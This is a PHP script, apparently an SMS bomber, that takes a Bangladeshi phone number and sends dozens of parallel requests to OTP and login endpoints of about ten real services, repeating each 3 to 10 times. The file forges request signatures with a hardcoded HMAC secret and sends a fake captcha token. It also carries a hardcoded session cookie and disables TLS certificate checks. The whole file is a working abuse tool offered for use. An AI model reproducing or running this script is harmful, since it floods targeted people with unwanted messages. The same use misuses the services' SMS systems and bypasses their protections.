<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0); 
set_time_limit(0); 

$phone = $_GET['phone'] ?? '';

// ১. ফোন নাম্বার ভ্যালিডেশন
if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
}

// ফোন ফরমেটিং (সব এপিআই-এর জন্য আলাদা ফরম্যাট)
$phone_11 = preg_replace('/^\+?88/', '', $phone);
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;
$phone_88 = "88" . $phone_11;
$phone_plus88 = "+88" . $phone_11;
$deepto_number = "+880" . substr($phone_11, -10); // DeeptoPlay এর জন্য +880 ফরম্যাট

// ২. Swap API Signature (Fixed Secret)
$swap_secret = "UFNyP1f+s2bjwVAFbOBv87a142orsWLt7X/4M7pMVyE="; 
$swap_timestamp = (string) time(); 
$swap_signature = base64_encode(hash_hmac('sha256', $phone_plus88 . $swap_timestamp, $swap_secret, true));

$api_requests = [];

// ==========================================
// 🔴 FIXED & ADDED: DeeptoPlay (৩ বার)
// ==========================================
for($i=1; $i<=3; $i++){
    $api_requests[] = [
        "name" => "deeptoplay_$i",
        "url" => "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        "method" => "POST",
        "data" => ["number" => $deepto_number],
        "headers" => [
            'Content-Type: application/json',
            'Accept: application/json',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'origin: https://www.deeptoplay.com',
            'referer: https://www.deeptoplay.com/'
        ]
    ];
}

// ==========================================
// 🟠 FIXED: Swap, Garibook, PBS, Iqra
// ==========================================

// Swap (১০ বার)
for($i=1; $i<=10; $i++){
    $api_requests[] = [
        "name" => "swap_$i",
        "url" => "https://api.swap.com.bd/api/v1/send-otp/v2",
        "data" => ["phone" => $phone_plus88, "timestamp" => (int)$swap_timestamp],
        "headers" => ['Content-Type: application/json', 'signature: '.$swap_signature, 'Origin: https://swap.com.bd']
    ];
}

// Garibook (৫ বার)
for($i=1; $i<=5; $i++){
    $api_requests[] = [
        "name" => "garibook_$i",
        "url" => "https://api.garibookadmin.com/api/v4/user/login",
        "data" => ["mobile" => $phone_plus88, "recaptcha_token" => "garibookcaptcha", "channel" => "web"],
        "headers" => ['Content-Type: application/json', 'Origin: https://garibook.com']
    ];
}

// PBS (৫ বার)
for($i=1; $i<=5; $i++){
    $api_requests[] = [
        "name" => "pbs_$i",
        "url" => "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
        "data" => ["userPhone" => $phone_11],
        "headers" => ['Content-Type: application/json', 'Origin: https://pbs.com.bd']
    ];
}

// Iqra Live (৩ বার - GET)
for($i=1; $i<=3; $i++){
    $api_requests[] = [
        "name" => "iqra_$i",
        "url" => "https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,
        "method" => "GET",
        "headers" => ['Origin: https://iqra-live.com']
    ];
}

// ==========================================
// 🟢 OTHERS (Shwapno, RedX, Bikroy, BDTickets, Shikho)
// ==========================================

for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"shwapno_$i","url"=>"https://www.shwapno.com/api/auth","data"=>["phoneNumber"=>$phone_plus88],"headers"=>['Content-Type:application/json','cookie: cuid=98a49521-6662-498f-94eb-17d71974083f']];
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"redx_$i","url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json']];
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bikroy_$i","url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11","method"=>"GET","headers"=>['User-Agent:Mozilla/5.0']];
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bdtickets_$i","url"=>"https://api.bdtickets.com:20100/v1/auth","data"=>["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],"headers"=>['Content-Type:application/json','Origin:https://bdtickets.com']];
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"shikho_$i","url"=>"https://api.shikho.com/auth/v2/send/sms","data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],"headers"=>['Content-Type:application/json','Origin:https://shikho.com']];

// ==========================================
// ⚡ Parallel Multi-cURL Execution
// ==========================================
$mh = curl_multi_init();
$handles = [];

foreach($api_requests as $key => $api){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $headers = $api['headers'] ?? [];
    if (!in_array('User-Agent', array_column(array_map(fn($h) => explode(':', $h), $headers), 0))) {
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if(isset($api['method']) && $api['method'] === "GET"){
        curl_setopt($ch, CURLOPT_POST, false);
    } else {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data'] ?? []));
    }

    $handles[$key] = $ch;
    curl_multi_add_handle($mh, $ch);
}

$running = null;
do {
    $status = curl_multi_exec($mh, $running);
    if ($running) curl_multi_select($mh);
} while ($running > 0 && $status == CURLM_OK);

$final_results = [];
foreach($handles as $key => $ch){
    $res = curl_multi_getcontent($ch);
    $info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $final_results[$api_requests[$key]['name']] = [
        "code" => $info,
        "response" => json_decode($res, true) ?: $res
    ];
    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}
curl_multi_close($mh);

echo json_encode(["status" => "success", "data" => $final_results], JSON_PRETTY_PRINT);
?>
